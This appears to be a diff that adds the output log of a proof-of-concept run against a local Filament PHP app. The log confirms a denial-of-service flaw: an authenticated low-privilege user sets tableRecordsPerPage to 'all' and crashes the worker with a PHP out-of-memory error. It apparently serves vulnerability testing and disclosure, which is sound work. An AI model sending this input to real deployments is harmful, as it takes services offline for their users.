@@ -1,0 +1,13 @@
+========================================================================
+VULN-006: Unbounded tableRecordsPerPage → full-table load (DoS)
+========================================================================
+[INFO] target: http://localhost:21890
+[INFO] exercising: CanPaginateRecords::getTableRecordsPerPage — value returned verbatim, no clamp
+[SETUP] posts currently in table: 120008
+[SETUP] logging in as low-priv user ryan@filamentphp.com (any panel user can do this)
+[INFO] baseline: perPage=10 → HTTP 200 in 0.23s (one page hydrated)
+[STEP] setting public property tableRecordsPerPage='all' and re-rendering the table
+[PROOF] attack returned HTTP 500 after 27.63s — the worker crashed trying to hydrate/render the whole table
+[PROOF] app log: Allowed memory size of 536870912 bytes exhausted (tried to allocate 167772160 bytes) {"userId":2,"exception":"[object] (Symfony\\Component\\ErrorHandler\\Error\
+[OK] exploit confirmed — a single request (perPage='all') crashed the worker with an out-of-memory fatal; baseline was 0.23s
+==> VULN-006: CONFIRMED — one authenticated request with tableRecordsPerPage='all' exhausts PHP memory on a large table → worker DoS (A:H)
